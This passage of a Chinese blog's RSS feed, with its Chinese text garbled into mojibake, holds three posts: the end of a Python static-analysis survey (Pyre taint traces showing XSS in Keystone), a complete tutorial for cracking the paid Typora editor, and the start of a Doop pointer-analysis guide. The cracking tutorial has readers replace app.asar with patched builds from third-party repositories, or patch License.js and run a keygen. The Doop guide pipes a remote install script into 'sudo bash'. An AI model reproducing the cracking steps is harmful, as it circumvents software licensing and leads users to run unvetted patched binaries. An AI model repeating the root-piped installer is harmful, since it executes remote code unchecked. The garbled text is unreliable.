å¯ç”¨æœ¬åœ°è½¬å‘</span></span><br><span class="line">sudo sysctl -w net.ipv4.conf.ens160.route_localnet=1</span><br><span class="line"></span><br><span class="line"><span class="comment"># iptables é…ç½®è§„åˆ™</span></span><br><span class="line">sudo iptables -t nat -I PREROUTING -p tcp -d 10.112.148.73/24 --dport 2222 -j DNAT --to-destination 127.0.0.1:5000</span><br></pre></td></tr></table></figure><p>é€šè¿‡ Web UI æŸ¥çœ‹ç»“æœï¼Œä¸€å…±æ‰¾å‡º 13 ä¸ªé—®é¢˜ï¼Œå…¨æ˜¯å¯èƒ½çš„ XSS æ¼æ´ï¼š</p><img src="https://s2.loli.net/2021/12/30/rliNpZJgWLwbex4.png" style="zoom: 67%;" /><p>å¯¼å…¥çš„è¿‡æ»¤å™¨å¯ä»¥åœ¨ Filter ä¸­ä½¿ç”¨ï¼Œä¸è¿‡ keystone ä¸­æ²¡æœ‰æ£€æµ‹å‡ºè¿™äº›é—®é¢˜</p><img src="https://s2.loli.net/2021/12/30/5lWxd3sk7IKHnbM.png" style="zoom: 67%;" /><p>ç‚¹å¼€ä¸€ä¸ªé—®é¢˜çš„ Traces å±•ç¤ºï¼š</p><ul><li><code> UserControlled</code> ç±»å‹çš„æ±¡ç‚¹æ•°æ®ä¸€ç›´ä¼ æ’­åˆ° keystone.api.os_oauth1.RequestTokenResource.post å‡½æ•°<ul><li>æœ€çŸ­çš„ä¼ æ’­è·ç¦»</li></ul></li><li>æºç‚¹å’Œæ±‡ç‚¹çš„è¿½è¸ªåœ¨ keystone.api.os_oauth1.RequestTokenResource.post äº¤æ±‡</li><li><code> UserControlled</code> ç±»å‹çš„æ±¡ç‚¹æ•°æ®ä» keystone.api.os_oauth1.RequestTokenResource.post å¼€å§‹ï¼Œä¼ æ’­åˆ° XSS ç±»å‹çš„æ±‡ç‚¹<ul><li>å’Œäº¤æ±‡ç›¸åŒ</li></ul></li></ul><p>ä½¿ç”¨ <code>pyre query</code> å¯¼å‡ºæ•°æ®ï¼š<a href="https://raw.githubusercontent.com/jckling/Assets/master/python/graph.json">graph.json</a>ã€<a href="https://raw.githubusercontent.com/jckling/Assets/master/python/hierarchy.json">hierarchy.json</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å¯åŠ¨æœåŠ¡å™¨</span></span><br><span class="line">pyre start</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¯¼å‡ºè°ƒç”¨å›¾</span></span><br><span class="line">pyre query <span class="string">&quot;dump_call_graph()&quot;</span> | python -m json.tool &gt; graph.json</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¯¼å‡ºç±»å±‚æ¬¡ç»“æ„ï¼ˆçœç•¥å˜é‡ç±»å‹ï¼‰</span></span><br><span class="line">pyre query <span class="string">&quot;dump_class_hierarchy()&quot;</span> | python -m json.tool &gt; hierarchy.json</span><br><span class="line"></span><br><span class="line"><span class="comment"># å…³é—­æœåŠ¡å™¨</span></span><br><span class="line">pyre stop</span><br></pre></td></tr></table></figure><h2 id="ç»“è¯­"><a href="#ç»“è¯­" class="headerlink" title="ç»“è¯­"></a>ç»“è¯­</h2><p>å·®ä¸å¤šå¿«åŠå¹´å‰çš„ä¸œè¥¿äº†ï¼Œè€Œä¸”ç›®å‰ä¹Ÿæ²¡æœ‰åœ¨åš Python çš„é™æ€ç¨‹åºåˆ†æã€‚æ—¢ç„¶å½“æ—¶éƒ½è°ƒç ”å’Œè¯•ç”¨è¿‡äº†ï¼Œé‚£å°±ç¨å¾®ç†ä¸€ä¸‹å­˜æ¡£è¿™ä»½æµæ°´è´¦.jpg</p>]]></content:encoded>
      
      
      <category domain="https://jckling.github.io/categories/Security/">Security</category>
      
      
      <category domain="https://jckling.github.io/tags/Python/">Python</category>
      
      
      <comments>https://jckling.github.io/2021/12/30/Security/Python%20%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%E8%B0%83%E7%A0%94/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Typora æ¿€æ´»æ•™ç¨‹</title>
      <link>https://jckling.github.io/2021/12/24/Other/Typora%20%E6%BF%80%E6%B4%BB%E6%95%99%E7%A8%8B/</link>
      <guid>https://jckling.github.io/2021/12/24/Other/Typora%20%E6%BF%80%E6%B4%BB%E6%95%99%E7%A8%8B/</guid>
      <pubDate>Fri, 24 Dec 2021 09:52:12 GMT</pubDate>
      
      <description>æ”¯æŒæ­£å¼ç‰ˆï¼ˆ~1.4.xï¼‰å’Œå¼€å‘ç‰ˆï¼ˆ~1.5.xï¼‰</description>
      
      
      
      <content:encoded><![CDATA[<div class="note info flat"><p>è¯·æ”¯æŒæ­£ç‰ˆè½¯ä»¶</p></div><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ä¹‹å‰ç”¨ Typora çš„æ—¶å€™å´©æºƒè¿‡ä¸¤æ¬¡ï¼ˆå¯¼è‡´å†…å®¹å…¨æ— ï¼‰ï¼Œ<code>Ctrl + Z</code> ä¹Ÿæ— æ³•æ’¤é”€æ¢å¤ï¼Œç„¶åå°±ä¸æ€ä¹ˆæ•¢ç”¨äº†ã€‚åæ¥ä¹Ÿè¯•äº†è¯•å…¶ä»–æ”¯æŒ markdown çš„ç¼–è¾‘å™¨ï¼Œä½†ç¡®å® Typora çš„é¢œå€¼æœ€èƒ½æ‰“ã€‚</p><p>åŸæ¥ 2021.11 å°±æ¨å‡ºäº†æ­£å¼ç‰ˆ Typora 1.0ï¼Œç°åœ¨éƒ½ 1.4.8 äº†ï¼Œç›®å‰æ˜¯ ï¿¥89 ä»˜è´¹ä¹°æ–­ï¼Œæ”¯æŒæ¿€æ´»ä¸‰å°è®¾å¤‡ã€‚æœªæ¿€æ´»çš„æƒ…å†µä¸‹æ¯æ¬¡æ‰“å¼€éƒ½ä¼šå¼¹çª—ï¼š</p><img src="https://s2.loli.net/2021/12/24/8KyBpSdFsDVHtWh.jpg" style="zoom:80%;" /><p>ä¸è¿‡é€‰æ‹© <code>ä¸æ˜¯ç°åœ¨</code> ä¹‹åä¹Ÿå¯ä»¥å¥½å¥½ç”¨ï¼ˆï¼Ÿï¼‰å·¦ä¸‹è§’å¤šä¸€ä¸ª <code>æœªæ¿€æ´»</code>ï¼š</p><img src="https://s2.loli.net/2021/12/24/3iOwfDNMuB6Jb5n.jpg" style="zoom:80%;" /><h2 id="1-4-8-ç‰ˆæœ¬"><a href="#1-4-8-ç‰ˆæœ¬" class="headerlink" title="1.4.8 ç‰ˆæœ¬"></a>1.4.8 ç‰ˆæœ¬</h2><p>ä¸‹è½½ <a href="https://github.com/Delppine1024/TGreen/releases">app_asar_file_v1.4.8-windows-x64.zip</a>ï¼Œæ›¿æ¢ Typora å®‰è£…è·¯å¾„ä¸‹çš„ app.asarã€‚</p><img src="https://s2.loli.net/2022/12/17/vlHLud6BNKXi7k8.png" style="zoom:50%;" /><h2 id="1-2-4-ç‰ˆæœ¬"><a href="#1-2-4-ç‰ˆæœ¬" class="headerlink" title="1.2.4 ç‰ˆæœ¬"></a>1.2.4 ç‰ˆæœ¬</h2><p>ä¸‹è½½ <a href="https://github.com/SnapdragonLee/TyporaCrack/releases">app_asar_file_v1.2.4-windows-x64.zip</a>ï¼Œæ›¿æ¢ Typora å®‰è£…è·¯å¾„ä¸‹çš„ app.asarã€‚</p><img src="https://s2.loli.net/2022/03/30/abysPMEHNrCQ2ZX.png" style="zoom:50%;" /><h2 id="1-1-5-ç‰ˆæœ¬"><a href="#1-1-5-ç‰ˆæœ¬" class="headerlink" title="1.1.5 ç‰ˆæœ¬"></a>1.1.5 ç‰ˆæœ¬</h2><p>åŸæ¥çš„ä»£ç ä¸èƒ½ç›´æ¥ç”¨äºæ–°ç‰ˆæœ¬ï¼Œéœ€è¦æ ¹æ® <code>C:\Users\&#123;ç”¨æˆ·å&#125;\AppData\Roaming\Typora\typora.log</code> ä¿®æ”¹ä»£ç ã€‚</p><p>å½“ç„¶ï¼Œä¸ºäº†æ–¹ä¾¿ï¼Œç›´æ¥ä¸‹è½½ <a href="https://github.com/SnapdragonLee/TyporaCrack/releases">app_asar_v1.1.5.zip</a> æ›¿æ¢ Typora å®‰è£…è·¯å¾„ä¸‹çš„ app.asar æ–‡ä»¶å°±å¯ä»¥äº†ã€‚ä¾‹å¦‚ï¼Œæˆ‘éœ€è¦æ›¿æ¢çš„æ–‡ä»¶ä¸º <code>D:\Program Files\Typora\resources\app.asar</code>ã€‚</p><img src="https://s2.loli.net/2022/03/08/e6J9GbESQsa1BVY.png" style="zoom:50%;" /><p>æ›¿æ¢å®Œæ¯•åæ‰“å¼€ Typoraï¼Œå·²ç»æ¿€æ´»ã€‚</p><img src="https://s2.loli.net/2022/03/08/Q4funqhdGMYpUWA.png" style="zoom:50%;" /><h2 id="1-0-3-åŠä¹‹å‰ç‰ˆæœ¬"><a href="#1-0-3-åŠä¹‹å‰ç‰ˆæœ¬" class="headerlink" title="1.0.3 åŠä¹‹å‰ç‰ˆæœ¬"></a>1.0.3 åŠä¹‹å‰ç‰ˆæœ¬</h2><h3 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h3><p>ä½¿ç”¨ Windows ç³»ç»Ÿï¼Œå®‰è£…ä»¥ä¸‹è½¯ä»¶ï¼š</p><ul><li><a href="https://www.python.org/downloads/">Python3</a> + <a href="https://virtualenv.pypa.io/en/latest/installation.html">virtualenv</a></li><li><a href="https://git-scm.com/downloads">Git</a></li><li><a href="https://nodejs.org/zh-cn/download/">Node.js</a></li></ul><h3 id="æ­¥éª¤"><a href="#æ­¥éª¤" class="headerlink" title="æ­¥éª¤"></a>æ­¥éª¤</h3><ol><li><p>åˆ›å»ºè™šæ‹Ÿç¯å¢ƒ</p><p> åœ¨æ¡Œé¢å³é”®æ‰“å¼€ Git Bash</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># åˆ›å»ºæ–‡ä»¶å¤¹</span></span><br><span class="line"><span class="built_in">mkdir</span> tmp</span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¾ç½® python è™šæ‹Ÿç¯å¢ƒ</span></span><br><span class="line">virtualenv tmp</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿›å…¥ç›®æ ‡æ–‡ä»¶å¤¹</span></span><br><span class="line"><span class="built_in">cd</span> tmp</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ¿€æ´»è™šæ‹Ÿç¯å¢ƒ</span></span><br><span class="line"><span class="built_in">source</span> ./Scripts/activate</span><br></pre></td></tr></table></figure></li><li><p>å…‹éš†ä»£ç ä»“åº“ <a href="https://github.com/Mas0nShi/typoraCracker">Mas0nShi&#x2F;typoraCracker</a></p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/Mas0nShi/typoraCracker.git</span><br></pre></td></tr></table></figure></li><li><p>å®‰è£…ä¾èµ–</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è¿›å…¥æ–‡ä»¶å¤¹</span></span><br><span class="line"><span class="built_in">cd</span> typoraCracker</span><br><span class="line"></span><br><span class="line"><span class="comment"># å®‰è£…ä¾èµ–</span></span><br><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure></li><li><p>ç”Ÿæˆç ´è§£æ–‡ä»¶</p><p> æ³¨æ„å°† <code>D:\Program Files\Typora\resources\app.asar</code> æ›¿æ¢ä¸ºè‡ªå·±çš„ Typora å®‰è£…ç›®å½•ï¼Œæ‰§è¡Œå®Œæ¯•åä¼šç”Ÿæˆ <code>dec_app</code> æ–‡ä»¶å¤¹</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python typora.py <span class="string">&quot;D:\Program Files\Typora\resources\app.asar&quot;</span> .</span><br></pre></td></tr></table></figure></li><li><p>æ‹·è´ä»“åº“ä¸­çš„ License.js è®¸å¯è¯</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> ./example/patch/License.js ./dec_app/</span><br></pre></td></tr></table></figure></li><li><p>é‡æ–°ç”Ÿæˆ <code>app.asar</code></p><p> æ‰§è¡Œå®Œæ¯•åä¼šç”Ÿæˆ <code>app.asar</code> æ–‡ä»¶</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python typora.py -u ./dec_app/ .</span><br></pre></td></tr></table></figure></li><li><p>æ›¿æ¢ <code>app.asar</code></p><p> å¦‚æœå‘½ä»¤æç¤ºæƒé™ä¸è¶³ï¼Œå¯ä»¥äººå·¥è¿›è¡Œç§»åŠ¨</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å¤‡ä»½</span></span><br><span class="line"><span class="built_in">mv</span> <span class="string">&quot;D:\Program Files\Typora\resources\app.asar&quot;</span> <span class="string">&quot;D:\Program Files\Typora\resources\app.asar.bak&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ›¿æ¢</span></span><br><span class="line"><span class="built_in">mv</span> ./app.asar <span class="string">&quot;D:\Program Files\Typora\resources\app.asar&quot;</span></span><br></pre></td></tr></table></figure></li><li><p>ç”Ÿæˆåºåˆ—å·</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node ./example/keygen.js</span><br></pre></td></tr></table></figure></li><li><p>æ¿€æ´» Typora</p> <img src="https://s2.loli.net/2021/12/24/gbiVjK892UMGLEv.jpg" style="zoom:70%;" /></li></ol><h2 id="å‚é˜…"><a href="#å‚é˜…" class="headerlink" title="å‚é˜…"></a>å‚é˜…</h2><ul><li><a href="https://github.com/Mas0nShi/typoraCracker">Mas0nShi&#x2F;typoraCracker</a></li><li><a href="https://github.com/SnapdragonLee/TyporaCrack">SnapdragonLee&#x2F;TyporaCrack</a></li><li><a href="https://github.com/Delppine1024/TGreen">Delppine1024&#x2F;TGreen</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://jckling.github.io/categories/Other/">Other</category>
      
      
      <category domain="https://jckling.github.io/tags/Windows/">Windows</category>
      
      
      <comments>https://jckling.github.io/2021/12/24/Other/Typora%20%E6%BF%80%E6%B4%BB%E6%95%99%E7%A8%8B/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>æŒ‡é’ˆåˆ†æå·¥å…· Doop ä½¿ç”¨æŒ‡å—</title>
      <link>https://jckling.github.io/2021/12/17/Security/%E6%8C%87%E9%92%88%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%20Doop%20%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/</link>
      <guid>https://jckling.github.io/2021/12/17/Security/%E6%8C%87%E9%92%88%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%20Doop%20%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/</guid>
      <pubDate>Fri, 17 Dec 2021 03:41:30 GMT</pubDate>
      
      <description>ç®€æ˜“ä½¿ç”¨è¯´æ˜ + è‡ªå®šä¹‰ Datalog æ‰©å±•è§„åˆ™</description>
      
      
      
      <content:encoded><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>ä¸€è¾¹å­¦ä¹  Datalog&#x2F;Doop ä¸€è¾¹å¤ç°è®ºæ–‡ï¼Œçœ‹äº†äº›è®ºæ–‡è¡¥å……çŸ¥è¯†ï¼Œåšäº†äº›å®éªŒéªŒè¯ç†è§£ã€‚ä¸­æ–‡èµ„æ–™å°‘å°±ç®—äº†ï¼Œè‹±æ–‡èµ„æ–™ä¹Ÿæ²¡æœ‰éå¸¸ç³»ç»Ÿçš„ï¼Œäºæ˜¯ç»å¸¸åœ¨é¢‘é“é‡Œæé—®ğŸ¤£ã€‚åœ¨è¿™ä¸Šé¢èŠ±äº†å¤§çº¦ä¸€æ•´ä¸ªæœˆçš„æ—¶é—´ï¼Œç„¶åè¿˜æ²¡æœ‰å¤ç°å‡ºæ¥â€¦ è¢«æŠ“å»å­¦ Soot åšåˆ†æï¼Œä½†æ˜¯ç¡®è®¤äº†æƒ³æ³•ä¹‹åå‘ç°ç”¨ Soot è¿˜å¾—å®ç°è¿‡ç¨‹å†…æ•°æ®æµåˆ†æï¼Œè€Œè¿™åªæ˜¯åˆ†æçš„ç¬¬ä¸€æ­¥ï¼Œæ¶‰åŠåˆ°è¿‡ç¨‹é—´çš„æ•°æ®æµé‚£ä¸è¿˜å¾—å†å®ç°ä¸€éè¿‡ç¨‹é—´åˆ†æï¼Ÿ</p><p>ä¸çŸ¥é“ä¹‹åæ€ä¹ˆå®‰æ’ï¼Œåæ­£æ—¢ç„¶éƒ½ç”¨äº†è¿™ä¹ˆä¹…ï¼Œå°±æŠŠç†è§£çš„å†…å®¹æ¢³ç†ä¸€ä¸‹ï¼Œè‡ªå·±ç”¨çš„æ—¶å€™ä¹Ÿæ–¹ä¾¿æ£€ç´¢ã€‚</p><h1 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h1><p>ä½¿ç”¨ Doop å‰éœ€è¦å®‰è£… Datalog å¼•æ“ï¼Œç”±äºé»˜è®¤çš„ souffle ä¸æ”¯æŒ Windowsï¼Œå› æ­¤å»ºè®®åœ¨ Linux ç¯å¢ƒä¸‹ä½¿ç”¨ã€‚</p><p>Doop æ”¯æŒä¸¤ä¸ªå¼•æ“ï¼šå•†ä¸šçš„ <a href="http://www.logicblox.com/">LogicBlox</a> å’Œå¼€æºçš„ <a href="https://github.com/souffle-lang/souffle">souffle</a>ï¼Œé»˜è®¤ä½¿ç”¨ souffleã€‚</p><ul><li>LogicBlox v3 å¹³æ›¿ï¼š<a href="http://snf-705535.vm.okeanos.grnet.gr/agreement.html">PA-Datalog</a></li></ul><p>ä¹‹å‰å·²ç»æ¢³ç†è¿‡ä¸¤ä¸ªå¼•æ“çš„ä½¿ç”¨ï¼Œä¸äº†è§£çš„å¯ä»¥å…ˆçœ‹ä¸€ä¸‹åŸºæœ¬è¯­æ³•ï¼š</p><ul><li><a href="https://jckling.github.io/2021/10/26/Other/LogiQL%20%E5%85%A5%E9%97%A8/">LogiQL å…¥é—¨</a></li><li><a href="https://jckling.github.io/2021/11/22/Other/Datalog%20%E5%BC%95%E6%93%8E%20Souffl%C3%A9%20%E6%8C%87%E5%8D%97/">Datalog å¼•æ“ SoufflÃ© æŒ‡å—</a></li></ul><p>Doop ä» LogicBlox è¿ç§»åˆ° souffle çš„åŸå› ï¼š<a href="https://yanniss.github.io/doop2souffle-soap17.pdf">Porting Doop to Souffle: A Tale of Inter-Engine Portability for Datalog-Based Analyses</a>ï¼Œä¹Ÿæœ‰æ–‡ç« æè¿‡ souffle çš„æ‰§è¡Œé€Ÿåº¦æ›´å¿«ã€‚</p><p><strong>1. å®‰è£… souffle å¼•æ“</strong></p><p>ç›®å‰æ”¯æŒ 1.5.1ã€2.0.2ã€2.1ï¼ˆä¸‹é¢çš„å®‰è£…æŒ‡ä»¤å¯èƒ½ä¼šç›´æ¥å®‰è£…æœ€æ–°ç‰ˆçš„ï¼‰</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -s https://packagecloud.io/install/repositories/souffle-lang/souffle/script.deb.sh | sudo bash</span><br><span class="line">sudo apt-get install souffle</span><br></pre></td></tr></table></figure><p>å¯èƒ½ä¼šå‡ºç°é”™è¯¯ï¼Œè¿™ä¸ªå¾—ç­‰ souffle é‚£è¾¹ä¿®å¤xd</p><p><img src="https://s2.loli.net/2021/12/17/Zm9NLfAIdBTiQUh.png"></p><p><strong>2. å®‰è£… doop</strong></p><p>æ‹‰å–ä»“åº“å°±å¯ä»¥äº†ï¼Œæ³¨æ„éœ€è¦å®‰è£… java8</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å®‰è£… java8</span></span><br><span class="line">sudo apt install java-8-openjdk</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸‹è½½ä»“åº“</span></span><br><span class="line">git <span class="built_in">clone</span> https://bitbucket.org/yanniss/doop.git</span><br></pre></td></tr></table></figure><h1 id="ä½¿ç”¨æ–¹å¼"><a href="#ä½¿ç”¨æ–¹å¼" class="headerlink" title="ä½¿ç”¨æ–¹å¼"></a>ä½¿ç”¨æ–¹å¼</h1><h2 id="åŸºæœ¬è¯´æ˜"><a href="#åŸºæœ¬è¯´æ˜" class="headerlink" title="åŸºæœ¬è¯´æ˜"></a>åŸºæœ¬è¯´æ˜</h2><p>è¿›å…¥ doop æºç ç›®å½•ä¸‹ä½¿ç”¨ï¼Œ<code>./doop --help all</code> æŸ¥çœ‹æ‰€æœ‰å¸®åŠ©ä¿¡æ¯ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> doop</span><br><span class="line">./doop --<span class="built_in">help</span> all</span><br></pre></td></tr></table></figure><p>é¦–å…ˆ <code>-a,--analysis &lt;NAME&gt;</code> ç”¨äºæŒ‡å®šåˆ†æï¼Œé€šå¸¸æƒ…å†µä¸‹ï¼Œæ•æ„Ÿåº¦ä¸Šå»äº†åˆ†æè€—æ—¶ä¹Ÿå°±ä¸Šå»äº†ï¼Œå› æ­¤æˆ‘ä¸ªäººä¸€èˆ¬åªç”¨ <code>context-insensitive</code> ä¸Šä¸‹æ–‡ä¸æ•æ„Ÿåˆ†æã€‚æœ‰å…³ä½¿ç”¨ Datalog è¿›è¡ŒæŒ‡é’ˆåˆ†æå¯ä»¥çœ‹ <a href="http://yanniss.github.io/points-to-tutorial15.pdf">Pointer Analysis</a>ã€‚</p><p>æ³¨ï¼š<code>LB analyses</code> ä¹‹åçš„æ˜¯é€‚ç”¨äº LogicBlox çš„åˆ†æé€‰é¡¹ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">-a,--analysis &lt;NAME&gt;                                      The name of the analysis. Valid values: 1-call-site-sensitive, 1-call-site-sensitive+heap, 1-object-1-type-sensitive+heap, 1-object-sensitive,</span><br><span class="line">                                                          1-object-sensitive+heap, 1-type-sensitive, 1-type-sensitive+heap, 2-call-site-sensitive+2-heap, 2-call-site-sensitive+heap, 2-object-sensitive+2-heap,</span><br><span class="line">                                                          2-object-sensitive+heap, 2-type-object-sensitive+2-heap, 2-type-object-sensitive+heap, 2-type-sensitive+heap, 3-object-sensitive+3-heap,</span><br><span class="line">                                                          3-type-sensitive+2-heap, 3-type-sensitive+3-heap, adaptive-2-object-sensitive+heap, basic-only, context-insensitive, context-insensitive-plus,</span><br><span class="line">                                                          context-insensitive-plusplus, data-flow, dependency-analysis, fully-guided-context-sensitive, micro, partitioned-2-object-sensitive+heap,</span><br><span class="line">                                                          selective-2-object-sensitive+heap, sound-may-point-to, sticky-2-object-sensitive, types-only, xtractor, ----- (LB analyses) -----,</span><br><span class="line">                                                          2-object-sensitive+heap-plus, adaptive-insens-2objH, adaptive2-insens-2objH, must-point-to, naive, paddle-2-object-sensitive, paddle-2-object-sensitive+heap,</span><br><span class="line">                                                          partial-insens-s2objH, refA-2-call-site-sensitive+heap, refA-2-object-sensitive+heap, refA-2-type-sensitive+heap, refB-2-call-site-sensitive+heap,</span><br><span class="line">                                                          refB-2-object-sensitive+heap, refB-2-type-sensitive+heap, scc-2-object-sensitive+heap, selective-2-type-sensitive+heap, selective_A-1-object-sensitive,</span><br><span class="line">                                                          selective_B-1-object-sensitive, special-2-object-sensitive+heap, stutter-2-object-sensitive+heap, uniform-1-object-sensitive,</span><br><span class="line">                                                          uniform-2-object-sensitive+heap, uniform-2-type-sensitive+heap</span><br></pre></td></tr></table></figure><p>ä»ä¸Šå¾€ä¸‹åˆ—ä¸¾å¯èƒ½ä¼šç”¨åˆ°çš„ä¸€äº›é€‰é¡¹ï¼Œ<code>--android</code> è¡¨ç¤ºåˆ†æå®‰å“ç¨‹åºï¼›<code>--app-only</code> è¡¨ç¤ºè§£æåº”ç”¨ç¨‹åºè¾“å…¥ï¼Œå¿½ç•¥ JDKï¼›<code>--cfg</code> è¡¨ç¤ºç”Ÿæˆæ§åˆ¶æµå›¾ï¼›<code>--dry-run</code> ç”Ÿæˆäº‹å®ï¼Œä¸æ‰§è¡Œåˆ†æï¼›<code>--extra-logic</code> ç”¨äºæ·»åŠ è‡ªå·±çš„ Datalog è§„åˆ™ï¼›<code>--gen-opt-directives</code> æ·»åŠ ç”¨äºè°ƒä¼˜çš„å…³ç³»ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">--android                                              Force Android mode <span class="keyword">for</span> code inputs that are not <span class="keyword">in</span> .apk format.</span><br><span class="line">--app-only                                             Only analyze the application input(s), ignore libraries/platform.</span><br><span class="line">--cfg                                                  Perform a CFG analysis.</span><br><span class="line">--dry-run                                              Do a dry run of the analysis (generate facts and compile but don<span class="string">&#x27;t run analysis logic).</span></span><br><span class="line"><span class="string">--extra-logic &lt;FILE&gt;                                   Include files with extra rules.</span></span><br><span class="line"><span class="string">--gen-opt-directives                                   Generate additional relations for code optimization uses.</span></span><br></pre></td></tr></table></figure><p><code>-h</code> å¸®åŠ©ä¿¡æ¯å¯ä»¥åˆ†ç±»æŸ¥çœ‹ï¼›<code>-i</code> æŒ‡å®šè¾“å…¥ï¼Œç”šè‡³å¯ä»¥æ˜¯ maven-idï¼ˆä¾‹å¦‚ï¼Œ<code>commons-collections:commons-collections:3.1</code>ï¼‰ï¼›<code>--id ç”¨äºæŒ‡å®šè¾“å‡ºæ–‡ä»¶å¤¹çš„åç§°ï¼Œé»˜è®¤éšæœºé•¿ä¸²</code>ï¼›<code>-L</code> æ”¹å˜æ—¥å¿—çº§åˆ«ï¼›<code>--max-memory</code> è®¾ç½®å†…å­˜æ¶ˆè€—ä¸Šé™ï¼Œæ¨æµ‹ä¸æŒ‡å®šå°±æ˜¯æ— ä¸Šé™ï¼ˆå› ä¸ºè·‘åˆ°è¿‡ 800G å†…å­˜ï¼‰ï¼›<code>--platform</code> é»˜è®¤ Java8 ä¸ç”¨è®¾ç½®ï¼›<code>-t</code> é»˜è®¤è¶…æ—¶æ—¶é—´ 90minï¼›<code>-v</code> æ‰“å°ç‰ˆæœ¬ä¿¡æ¯ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">-h,--<span class="built_in">help</span> &lt;SECTION&gt;                                       Display <span class="built_in">help</span> and <span class="built_in">exit</span>. Valid values: all, configuration, data-flow, datalog-engine, entry-points, fact-generation, heap-snapshots, information-flow,</span><br><span class="line">                                                          native-code, open-programs, python, reflection, server-logic, statistics, xtras</span><br><span class="line">-i,--input-file &lt;INPUT&gt;                                   The (application) input files of the analysis. Accepted formats: .jar, .war, .apk, .aar, maven-id</span><br><span class="line">   --<span class="built_in">id</span> &lt;ID&gt;                                              The analysis <span class="built_in">id</span>. If omitted, it is automatically generated.</span><br><span class="line">-L,--level &lt;LOG_LEVEL&gt;                                    Set the <span class="built_in">log</span> level: debug, info or error (default: info).</span><br><span class="line">-l,--library-file &lt;LIBRARY&gt;                               The dependency/library files of the application. Accepted formats: .jar, .apk, .aar</span><br><span class="line">   --max-memory &lt;MEMORY_SIZE&gt;                             The maximum memory that the analysis can consume (does not include memory needed by fact generation). Example values: 2m, 4g.</span><br><span class="line">   --platform &lt;PLATFORM&gt;                                  The platform on <span class="built_in">which</span> to perform the analysis. For Android, the plaftorm suffix can either be <span class="string">&#x27;stubs&#x27;</span> (provided by the Android SDK), <span 